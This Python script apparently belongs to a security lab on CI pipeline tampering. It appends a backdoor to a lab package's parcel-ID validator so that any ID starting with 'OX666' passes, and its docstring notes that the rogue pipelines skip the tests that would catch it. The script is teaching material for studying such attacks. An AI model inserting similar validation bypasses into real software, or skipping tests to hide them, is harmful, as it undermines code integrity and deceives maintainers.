#!/usr/bin/env python3
"""LAB ONLY - simulated malicious change used by the rogue pipelines.

Appends a backdoor to src/orgx_parcel/ids.py: every parcel ID starting with
"OX666" is accepted, whatever its check digit. The unit test
test_rejects_reserved_prefix_without_valid_check_digit catches it, which is why
the rogue pipelines skip the tests - exactly what a real attacker would do.
"""

from pathlib import Path

MARKER = "# --- injected by attacks/inject_backdoor.py (LAB ONLY) ---"
TARGET = Path(__file__).resolve().parents[1] / "src" / "orgx_parcel" / "ids.py"

BACKDOOR = f'''

{MARKER}
_genuine_is_valid = is_valid


def is_valid(parcel_id: str) -> bool:  # noqa: F811
    return parcel_id.startswith("OX666") or _genuine_is_valid(parcel_id)
'''


def main() -> int:
    code = TARGET.read_text()
    if MARKER in code:
        print("backdoor already present")
        return 0
    TARGET.write_text(code + BACKDOOR)
    print(f"backdoor injected into {TARGET}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
